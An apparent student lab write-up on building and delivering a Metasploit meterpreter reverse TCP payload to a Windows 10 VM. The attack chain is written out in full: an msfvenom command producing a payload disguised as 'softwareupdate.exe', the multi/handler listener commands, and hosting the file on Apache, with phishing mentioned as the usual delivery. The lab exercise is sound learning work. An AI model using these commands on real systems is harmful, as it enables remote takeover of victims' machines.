# Reverse TCP Shell Using Metasploit 

## Objective

In this lab, I will exploit a Windows 10 system using the Metasploit Framework on Kali Linux. By doing so, I will have near-complete access to the victim machine through a reverse TCP shell. Once the shell is established, I will then demonstrate the ability to read directories and files on the target machine. 

The steps below can be followed in order to achieve the same results. 

### Skills Learned

- Networking Concepts
- Metasploit Framework 
- Post-Exploitation Techniques
- Payload Creation

### Project Enviroment Details
- Machine A is a Kali Linux VM.
- Machine B is a Windows 10 VM.
- For testing purposes both machines are on the same network (10.0.2.0/24).
- For testing purposes antivirus will be disabled.
- For testing purposes the Windows 10 firewall is disabled.

# Steps

## Determining the Attacking Machine's IP Address
Before creating the payload, I need to make a note of my Kali system's IP address. By using the command "ifconfig", I am able to quickly view network interface information. I need to gather the IP address of the attacking machine because it is used in the command for the malicious payloads creation. 

![Kali IP Photo](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/02c180ec-a0d8-4b74-a74d-e2509063e0a3)

You can see above that the IP address for Machine A is "10.0.2.15".

## Payload Creation
Now that the IP address is identified, I need to create the executable payload that will be used to establish the reverse TCP shell. In order to do so, I can use the Metasploit's "msfvenom" command. Msfvenom is a metasploit command that allows users to create custom payloads for their targets. 

Our target machine is a Windows 10 system so I will be using Msfvenom's Windows Reverse Shell Command. The command is as follows: "msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform win -f exe LHOST=10.0.2.15 LPORT=4444 -o /home/kali/softwareupdate.exe"

![Msfvenom_payload creation](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/404ad24e-66ce-47cf-b56c-1106d451fa5a)

The command is comprised of multiple components that specify exactly what executable payload I want to create. In this instance, I want msfvenom to create an  windows executable file to establish the reverse tcp shell connection.

Command Components:
- "-p windows/meterpreter/reverse_tcp" specifies that I want to create a meterpreter reverse TCP shell.
- "-a x86 --platform win" specifies the architecture and platform I want the payload generated for.
- LHOST is where I input my attacking machines IP Address.
- LPORT's purpose is to specify what port the attacking machine should listen on for when the victim machine runs the executable.
- "/home/kali/softwareupdate.exe" specifies the install location and file name.

## Establishing a listener
With the payload created and installed to my specified path "/home/kali", I need to create a listener before launching my attack. A listener is a key component in my reverse shell attack. The listener's role is to wait for the incoming connection from the target machine once its been compromised. Once the listener picks up the target machines signal, the session will be opened. 

![msfconsole photo](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/1270309f-345b-4cbe-babe-b3c21d5cd836)

Using the "msfconsole" command, metasploit's console will be launched. 

Once the console finishes loading, I can begin creating the listener using metasploit's generic payload handling commands. 

The following commands need to be entered in the console to create the listener:

- use multi/handler
- set payload windows/meterpreter/reverse_tcp
- set LHOST 10.0.2.15
- set LPORT 4444
- run

![awaiting connection photo 2](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/b1edd722-11ae-49c9-b932-3218328653a0)

I can easily see my listener is active once the "[*] Started reverse TCP handler on 10.0.2.15:4444" is shown. 

## Delivery
Now that the malicious payload was created and the listener is active, I need to get my payload to the target machine. For this project I will be hosting the executable file on a web server using apache. Apache will accept an HTTP request from the target machine and send the malicious executable. Ordinarily the delivery can be done through social engineering, phishing emails, and USB drop attacks. 

![starting apache2](https://github.com/NPIRNER/Reverse-TCP-Connection-Using-Metasploit-Framework/assets/115173142/04bf87a0-714a-4463-9980-485b14405710)






## Reverse TCP Shell
A reverse TCP shell is a type of shell session initiated by the target machine connecting back to the attacker's machine. By initiating a reverse TCP shell, the attacker will gain remote control over the compromised system. This allows the attacker capabilities to execute commands on the target machine and even transfer of data between both macines. 



 


